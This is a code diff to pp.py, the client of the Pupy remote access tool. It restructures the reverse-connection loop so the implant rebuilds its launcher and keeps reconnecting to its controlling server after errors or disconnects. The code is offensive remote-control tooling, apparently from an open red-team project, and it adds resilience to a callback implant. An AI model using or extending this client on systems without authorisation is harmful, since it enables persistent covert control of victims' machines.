@@ -123,9 +123,12 @@ def add_pseudo_pupy_module(HOST):
 		mod.get_connect_back_host=(lambda : HOST)
 		mod.pseudo=True
 
+attempt=0
+
 def main():
 	global LAUNCHER
 	global LAUNCHER_ARGS
+	global attempt
 
 	if len(sys.argv)>1:
 		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
@@ -145,77 +148,79 @@ def main():
 			exec config_file in globals()
 		except ImportError:
 			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
-
-	launcher=conf.launchers[LAUNCHER]()
-	try:
-		launcher.parse_args(LAUNCHER_ARGS)
-	except LauncherError as e:
-		launcher.arg_parser.print_usage()
-		exit(str(e))
-
-	if "pupy" not in sys.modules:
-		add_pseudo_pupy_module(launcher.get_host())
-	else:
-		pupy.get_connect_back_host=launcher.get_host
-
-	import pupy
-	pupy.infos={} #global dictionary to store informations persistent through a deconnection
-	pupy.infos['launcher']=LAUNCHER
-	pupy.infos['launcher_args']=LAUNCHER_ARGS
-		
-	attempt=0
 	while True:
 		try:
-			for stream in launcher.iterate():
-				try:
-					def check_timeout(event, cb, timeout=10):
-						start_time=time.time()
-						while True:
-							if time.time()-start_time>timeout:
-								if not event.is_set():
-									logging.error("timeout occured !")
-									cb()
-								break
-							elif event.is_set():
-								break
-							time.sleep(0.5)
-					event=threading.Event()
-					t=threading.Thread(target=check_timeout, args=(event, stream.close))
-					t.daemon=True
-					t.start()
-					try:
-						conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
-					finally:
-						event.set()
-					while True:
-						attempt=0
-						conn.serve()
-				except KeyboardInterrupt:
-					raise
-				except EOFError:
-					raise
-				except SystemExit:
-					raise
-				except Exception as e:
-					logging.error(e)
-					
-		except EOFError:
-			print "EOF received. exiting."
-			break
-		except KeyboardInterrupt:
-			if not getattr(sys, 'frozen', False):
-				print ""
-				break
+			launcher=conf.launchers[LAUNCHER]()
+			try:
+				launcher.parse_args(LAUNCHER_ARGS)
+			except LauncherError as e:
+				launcher.arg_parser.print_usage()
+				exit(str(e))
+
+			if "pupy" not in sys.modules:
+				add_pseudo_pupy_module(launcher.get_host())
 			else:
-				print "keyboard interrupt raised, restarting the connection"
-		except SystemExit as e:
-			logging.error(e)
-			break
-		except Exception as e:
-			logging.error(e)
+				pupy.get_connect_back_host=launcher.get_host
+
+			import pupy
+			pupy.infos={} #global dictionary to store informations persistent through a deconnection
+			pupy.infos['launcher']=LAUNCHER
+			pupy.infos['launcher_args']=LAUNCHER_ARGS
+			rpyc_loop(launcher)
 		finally:
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
+def rpyc_loop(launcher):
+	global attempt
+	try:
+		for stream in launcher.iterate():
+			try:
+				def check_timeout(event, cb, timeout=10):
+					start_time=time.time()
+					while True:
+						if time.time()-start_time>timeout:
+							if not event.is_set():
+								logging.error("timeout occured !")
+								cb()
+							break
+						elif event.is_set():
+							break
+						time.sleep(0.5)
+				event=threading.Event()
+				t=threading.Thread(target=check_timeout, args=(event, stream.close))
+				t.daemon=True
+				t.start()
+				try:
+					conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
+				finally:
+					event.set()
+				while True:
+					attempt=0
+					conn.serve()
+			except KeyboardInterrupt:
+				raise
+			except EOFError:
+				raise
+			except SystemExit:
+				raise
+			except Exception as e:
+				logging.error(e)
+				
+	except EOFError:
+		print "EOF received. exiting."
+		raise
+	except KeyboardInterrupt:
+		if not getattr(sys, 'frozen', False):
+			print ""
+			raise
+		else:
+			print "keyboard interrupt raised, restarting the connection"
+	except SystemExit as e:
+		logging.error(e)
+		raise
+	except Exception as e:
+		logging.error(traceback.format_exc())
+		return
 
 if __name__=="__main__":
 	main()
